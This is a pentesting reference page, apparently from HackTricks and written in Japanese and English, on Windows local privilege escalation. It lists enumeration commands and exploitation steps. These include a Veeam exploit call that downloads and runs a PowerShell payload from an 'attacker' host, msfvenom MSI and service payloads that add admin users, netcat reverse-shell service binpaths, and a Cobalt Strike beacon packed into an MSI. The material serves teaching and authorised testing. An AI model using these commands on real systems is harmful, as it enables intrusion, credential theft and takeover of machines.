# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期の Windows 理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、先に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細は次のページを参照してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が分からない場合は、先に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの列挙を**妨げる**、実行ファイルの実行を阻害する、あるいはあなたの活動を**検出する**などの様々な機能があります。privilege escalation の列挙を開始する前に、次の**ページ**を**読み**、これらすべての**防御****メカニズム**を**列挙**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

AppInfo の secure-path チェックが回避されると、`RAiLaunchAdminProcess` を通じて起動された UIAccess プロセスを悪用して、プロンプトなしで High IL に到達できます。専用の UIAccess/Admin Protection バイパス ワークフローは次を参照してください：


{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop の accessibility registry propagation は任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます：


{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認すること）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) は Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。  
このデータベースには 4,700 件以上の脆弱性が登録されており、Windows 環境が抱える **膨大な攻撃面** を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) (Winpeas は watson を組み込んでいます)

**システム情報を用いてローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

認証情報や機密性の高い情報が env 変数に保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

この機能を有効にする方法は[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学べます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部などが含まれます。ただし、実行の全詳細や出力結果が記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最新15件のイベントを表示するには、次のコマンドを実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関するすべてのアクティビティと実行内容が完全に記録され、各コードブロックが実行中に文書化されることが保証されます。この記録により、各アクティビティの包括的な監査トレイルが保持され、forensicsやmalicious behaviorの解析に有用です。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察を得ることができます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
最後の20件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使って要求されている場合、システムを侵害できます。

まず、ネットワークが non-SSL の WSUS アップデートを使用しているかを確認するため、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell で次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信が返ってきた場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` の場合。

Then、 **悪用可能です。** 最後のレジストリ値が `0` の場合は、WSUS エントリは無視されます。

この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - これらは非SSL の WSUS トラフィックに '偽' のアップデートを注入するための MiTM 用悪用スクリプトです。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
要約すると、このバグが悪用する脆弱性は以下のとおりです:

> ローカルユーザのプロキシを変更する権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分自身のトラフィックを傍受し、アセット上で昇格したユーザとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、その証明書ストアも利用します。WSUS ホスト名用の自己署名証明書を生成してそれを現在のユーザの証明書ストアに追加すれば、HTTP と HTTPS 両方の WSUS トラフィックを傍受できます。WSUS は証明書に対して HSTS のような仕組みを持たず、トラストオンファーストユース型の検証を実装していません。提示された証明書がユーザにより信頼され、ホスト名が正しければ、サービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使用して悪用できます（入手可能になれば）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くの企業向けエージェントは localhost 上に IPC インターフェースと特権付きのアップデートチャネルを公開しています。enrollment を攻撃者サーバに誘導でき、アップデータが不正なルート CA や弱い署名検証を信頼する場合、ローカルユーザは SYSTEM サービスがインストールする悪意のある MSI を配布できます。一般化した手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）は以下を参照してください:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は **TCP/9401** 上で localhost サービスを公開しており、攻撃者制御のメッセージを処理して **NT AUTHORITY\SYSTEM** として任意のコマンドを実行させることができます。

- **Recon**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: `VeeamHax.exe` のような PoC と必要な Veeam DLL を同一ディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードをトリガーします:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
そのサービスはコマンドを SYSTEM として実行します。

## KrbRelayUp

特定の条件下で、Windows の **domain** 環境において **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが self-rights を持ち **Resource-Based Constrained Delegation (RBCD),** を設定できること、およびユーザーがドメイン内にコンピュータを作成できる能力が含まれます。これらの**requirements**は**default settings**で満たされる点に注意してください。

次で**exploit in**を確認してください： [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃の流れに関する詳細は次を参照してください： [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** これら2つのレジストリ値が **enabled**（値が **0x1**）である場合、任意の権限のユーザーは `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使って、現在のディレクトリ内に権限昇格用の Windows MSI binary を作成します。このスクリプトは precompiled MSI installer を書き出し、user/group 追加を促します（そのため GIU access が必要になります）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使って MSI wrapper を作成する方法を学んでください。単にコマンドラインを実行したいだけの場合は、**.bat** ファイルをラップできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **生成**: Cobalt Strike または Metasploit で `C:\privesc\beacon.exe` に**新しい Windows EXE TCP payload**を生成します
- **Visual Studio** を開き、**Create a new project** を選択し、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、場所には **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** をクリックし続け、ステップ 3/4 (choose files to include) に到達するまで進めます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- インストール済みアプリをより正規に見せるために変更できる **Author** や **Manufacturer** といった他のプロパティもあります。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** を選択して **OK** をクリックします。これにより、インストーラが実行されるとすぐに Beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に **ビルド** します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの **インストール** を **バックグラウンド** で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出機能

### 監査設定

これらの設定は何が**記録**されるかを決めるので、注意してください。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログの送信先を把握しておくと有用です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピュータ上の **local Administrator passwords の管理** を目的としており、各パスワードが **一意で、ランダム化され、定期的に更新される** ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、権限があれば local admin passwords を表示できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**プレーンテキストのパスワードが LSASS に保存されます** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによるメモリの**読み取り**やコード注入の試みを**ブロック**することで、システムをさらに保護しました。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的は、デバイスに保存された認証情報を pass-the-hash 攻撃のような脅威から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントで利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、そのユーザーの domain credentials が確立されます.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属グループに興味深い権限がないか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

If you **何らかの特権グループに所属している場合、権限を昇格できる可能性があります。** Learn about privileged groups and how to abuse them to escalate privileges here:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**詳しくは** このページで **token** が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページを確認して、**興味深い tokens について学び**、それらを悪用する方法を理解してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオンユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず最初に、プロセスを列挙して、**プロセスのコマンドライン内にパスワードが含まれていないか確認**します。\
実行中のバイナリを**上書きできないか**、あるいはバイナリのフォルダに書き込み権限があり、潜在的な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できないか確認してください：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリのパーミッションを確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスは **credentials in clear text in memory** を保持していることがあるため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全な GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーに CMD を起動させたり、ディレクトリを参照させたりする可能性があります。**

例: "Windows Help and Support" (Windows + F1)、"command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers は、特定の条件が発生したときに Windows がサービスを起動できるようにします（named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.）。SERVICE_START 権限がなくても、トリガーを発生させることで特権サービスを起動できることがよくあります。列挙と起動の手法は以下を参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには、**sc**を使用できます。
```bash
sc qc <service_name>
```
各サービスの必要な特権レベルを確認するために、_Sysinternals_ からのバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
推奨されるのは、"Authenticated Users" が任意のサービスを変更できるか確認することです:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

次のようなエラーが発生する場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次のコマンドで有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するためには SSDPSRV に依存していることに注意してください（XP SP1 向け）**

**別の回避策** この問題の別の回避策は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービス上で "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更することが可能です。変更して **sc** を実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特権は以下のような権限を介して昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成できる。
- **WRITE_DAC**: アクセス許可の再設定を可能にし、その結果サービス構成を変更できるようになる。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再設定を許可する。
- **GENERIC_WRITE**: サービス構成を変更する権限を持つ。
- **GENERIC_ALL**: 同様にサービス構成を変更する権限を持つ。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できる。

### サービスバイナリの弱いアクセス許可

**サービスによって実行されるバイナリを変更できるか確認する** またはバイナリが存在するフォルダに **書き込み権限があるか** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** を使って取得できる（not in system32）し、権限は **icacls** で確認する:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** を使用することもできます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認してください。\
次のようにしてサービス**レジストリ**に対するあなたの**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
サービスによって実行されるバイナリを変更できるかどうかを、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認してください。もしそうであれば、サービスが実行するバイナリを改変できます。

To change the Path of the binary executed:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race による任意の HKLM 値書き込み (ATConfig)

一部の Windows のアクセシビリティ機能はユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスがこれを HKLM セッションキーにコピーします。レジストリの **symbolic link race** によって、その特権書き込みを **任意の HKLM パス** にリダイレクトでき、任意の HKLM への **value write** プリミティブを得られます。

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` にインストールされているアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザーが制御する設定を格納します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン/secure-desktop の遷移中に作成され、ユーザーが書き込み可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM によって書き込まれるよう、目的の **HKCU ATConfig** 値を設定します。
2. secure-desktop コピー（例: **LockWorkstation**）をトリガーして、AT ブローカーフローを開始させます。
3. レースに勝つため、`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を配置します；oplock が発生したら、**HKLM Session ATConfig** キーを保護された HKLM 先に向ける **registry link** に置き換えます。
4. SYSTEM がリダイレクトされた HKLM パスに攻撃者が選んだ値を書き込みます。

任意の HKLM 値書き込みが得られたら、サービス設定値を上書きして LPE にピボットします:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常のユーザーでも開始できるサービスを選び（例: **`msiserver`**）、書き込み後に起動します。**注意:** 公開されたエクスプロイト実装はレースの一部としてワークステーションをロックします。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory 権限

レジストリに対してこの権限があるということは、**このレジストリからサブレジストリを作成できる**ことを意味します。Windowsのサービスの場合、これは**任意のコードを実行するのに十分です:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスのパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は metasploit を使用して検出および悪用できます**: `exploit/windows/local/trusted_service_path`  
metasploit を使ってサービスバイナリを手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、serviceが失敗した場合に実行されるアクションをユーザーが指定できます。この機能はbinaryを指すように設定でき、そのbinaryが差し替え可能であればprivilege escalationが発生する可能性があります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**permissions of the binaries** や **フォルダ** の権限を確認してください（上書きできれば privilege escalation が可能かもしれません）。詳しくは [DLL Hijacking](dll-hijacking/index.html)。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

config file を変更して特定のファイルを読み取れるか、あるいは Administrator アカウント によって実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム内の脆弱なフォルダ/ファイルの権限を見つける方法は次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
